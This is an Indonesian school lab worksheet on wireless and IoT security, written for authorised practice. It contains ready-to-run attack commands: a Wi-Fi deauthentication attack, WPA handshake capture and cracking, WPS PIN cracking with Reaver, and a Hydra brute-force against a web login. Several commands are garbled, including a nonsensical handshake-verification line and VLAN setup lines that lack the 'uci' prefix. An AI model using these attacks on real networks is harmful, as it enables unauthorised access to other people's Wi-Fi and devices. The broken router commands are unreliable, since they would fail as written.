# 🛠️ Praktikum: Keamanan Jaringan Nirkabel dan IoT

## 🎯 Tujuan Pembelajaran
Setelah menyelesaikan praktikum ini, peserta didik mampu:
1. Menganalisis keamanan jaringan nirkabel
2. Melakukan pengujian keamanan Wi-Fi
3. Mengamankan perangkat IoT
4. Mendeteksi dan mencegah serangan jaringan nirkabel
5. Menerapkan praktik terbaik keamanan nirkabel

## 📋 Persiapan

### 1. Peralatan yang Diperlukan
- Komputer dengan OS Linux (disarankan Kali Linux)
- Kartu jaringan nirkabel yang mendukung monitor mode (contoh: Alfa AWUS036NHA)
- Router Wi-Fi untuk pengujian
- Perangkat IoT (contoh: smart plug, IP camera)
- Kabel Ethernet
- Koneksi internet

### 2. Software yang Diperlukan
- Aircrack-ng suite
- Wireshark
- Kismet
- Wifite
- Reaver (untuk WPS)
- MQTT Explorer (untuk pengujian IoT)

## 📝 Langkah Kerja

### 1. Persiapan Lingkungan

#### 1.1 Konfigurasi Kartu Nirkabel
```bash
# Periksa antarmuka nirkabel
iwconfig

# Aktifkan monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Verifikasi mode monitor
iwconfig wlan0mon
```

#### 1.2 Instalasi Tools yang Diperlukan
```bash
# Update sistem
sudo apt update && sudo apt upgrade -y

# Install tools keamanan nirkabel
sudo apt install -y aircrack-ng wireshark kismet wifite reaver mdk4

# Install tools IoT
sudo apt install -y mosquitto-clients mqtt-explorer
```

### 2. Analisis Jaringan Nirkabel

#### 2.1 Pemindaian Jaringan Wi-Fi
```bash
# Gunakan airodump-ng untuk memindai jaringan
sudo airodump-ng wlan0mon

# Simpan hasil capture ke file
sudo airodump-ng -w capture --output-format pcap wlan0mon
```

#### 2.2 Analisis Paket dengan Wireshark
```bash
# Buka file capture dengan Wireshark
wireshark capture-01.cap &

# Filter untuk melihat probe requests
wlan.fc.type_subtype == 0x04

# Filter untuk melihat handshake WPA/WPA2
eapol
```

### 3. Pengujian Keamanan Wi-Fi

#### 3.1 Mengumpulkan Handshake WPA/WPA2
```bash
# Targetkan jaringan tertentu
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon

# Di terminal lain, lakukan deauthentication attack
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c FF:FF:FF:FF:FF:FF wlan0mon

# Verifikasi handshake
your cap file "handshake-01.cap"
```

#### 3.2 Crack Password dengan Aircrack-ng
```bash
# Gunakan wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 handshake-01.cap

# Atau gunakan crunch untuk membuat wordlist
crunch 8 12 0123456789 -o wordlist.txt
```

#### 3.3 Uji Kerentanan WPS (Wi-Fi Protected Setup)
```bash
# Deteksi WPS aktif
sudo wash -i wlan0mon

# Crack PIN WPS dengan Reaver
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
```

### 4. Pengujian Perangkat IoT

#### 4.1 Pemindaian Perangkat IoT
```bash
# Gunakan nmap untuk memindai perangkat IoT
sudo nmap -sV -sC -O 192.168.1.100-200

# Periksa port terbuka
sudo nmap -p- --open -T4 192.168.1.100
```

#### 4.2 Uji Koneksi MQTT
```bash
# Langganan topik MQTT
mosquitto_sub -h 192.168.1.100 -t "#" -v

# Publikasi pesan
mosquitto_pub -h 192.168.1.100 -t "home/light" -m "on"
```

#### 4.3 Uji Kredensial Default
```bash
# Gunakan hydra untuk brute force login web
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

### 5. Mengamankan Jaringan Nirkabel

#### 5.1 Konfigurasi Router yang Aman
1. **Ubah Kredensial Default**
   ```bash
   # Contoh di router OpenWRT
   uci set system.@system[0].password='$p$admin$HASHED_PASSWORD'
   uci commit
   /etc/init.d/uhttpd restart
   ```

2. **Nonaktifkan WPS dan UPnP**
   ```bash
   uci set wireless.@wifi-device[0].wps_pushbutton='0'
   uci set upnp.config.enable_natpmp='0'
   uci set upnp.config.enable_upnp='0'
   uci commit
   /etc/init.d/network restart
   ```

3. **Aktifkan Firewall**
   ```bash
   # Blokir akses dari WAN ke halaman admin
   uci add firewall rule
   uci set firewall.@rule[-1].src='wan'
   uci set firewall.@rule[-1].target='REJECT'
   uci set firewall.@rule[-1].proto='tcp'
   uci set firewall.@rule[-1].dest_port='80 443'
   uci commit firewall
   /etc/init.d/firewall restart
   ```

#### 5.2 Segmentasi Jaringan untuk IoT
```bash
# Buat VLAN untuk perangkat IoT
uci add network device
uci set network.@device[-1].name='eth0.20'
uci set network.@device[-1].type='8021q'
uci set network.@device[-1].ifname='eth0'
uci set network.@device[-1].vid='20'

# Tambahkan interface VLAN
u set network.iot=interface
set network.iot.proto='static'
set network.iot.device='eth0.20'
set network.iot.ipaddr='192.168.20.1'
set network.iot.netmask='255.255.255.0'

# Atur firewall untuk VLAN IoT
uci add firewall zone
uci set firewall.@zone[-1].name='iot'
set firewall.@zone[-1].network='iot'
set firewall.@zone[-1].input='REJECT'
set firewall.@zone[-1].output='ACCEPT'
set firewall.@zone[-1].forward='REJECT'

# Commit dan restart
commit
/etc/init.d/network restart
```

## 📋 Laporan Praktikum

### 1. Pendahuluan
Jelaskan tujuan dan latar belakang praktikum keamanan jaringan nirkabel dan IoT.

### 2. Alat dan Bahan
Daftar semua peralatan dan perangkat lunak yang digunakan.

### 3. Langkah Kerja
Jelaskan langkah-langkah yang telah dilakukan selama praktikum.

### 4. Hasil Pengamatan
#### 4.1 Hasil Pemindaian Jaringan Nirkabel
```
# Tempelkan hasil airodump-ng
# Tampilkan daftar jaringan yang terdeteksi
```

#### 4.2 Hasil Pengujian Keamanan
```
# Tampilkan hasil handshake capture
# Tampilkan hasil cracking password (jika berhasil)
```

#### 4.3 Hasil Pengujian Perangkat IoT
```
# Tampilkan hasil pemindaian nmap
# Tampilkan hasil uji koneksi MQTT
```

### 5. Analisis
1. Kerentanan apa saja yang berhasil diidentifikasi?
2. Bagaimana tingkat risiko dari masing-masing kerentanan?
3. Apa saja rekomendasi untuk meningkatkan keamanan?

### 6. Kesimpulan
Berikan kesimpulan dari praktikum yang telah dilakukan.

## 📌 Tantangan Lanjutan
1. Coba lakukan pengujian pada protokol Zigbee atau Z-Wave
2. Implementasikan sistem deteksi intrusi untuk jaringan nirkabel
3. Buat laporan keamanan profesional dengan rekomendasi perbaikan

## ⚠️ Keamanan dan Etika
1. Hanya lakukan pengujian pada jaringan yang Anda miliki atau memiliki izin
2. Dokumentasikan semua temuan dengan baik
3. Laporkan kerentanan ke pemilik sistem dengan bertanggung jawab
4. Patuhi hukum dan etika yang berlaku

## 📚 Referensi
1. Aircrack-ng Documentation: https://www.aircrack-ng.org/
2. OWASP IoT Testing Guide: https://owasp.org/www-project-internet-of-things/
3. Wireshark User Guide: https://www.wireshark.org/docs/wsug_html/
4. NIST Guidelines for Securing Wireless Networks: https://csrc.nist.gov/

---
<div align="center">
  <p>Lembar Kerja Praktikum - Keamanan Jaringan Nirkabel dan IoT</p>
  <p>© 2025 SMKN 1 Punggelan - Program Keahlian Teknik Komputer dan Jaringan</p>
</div>
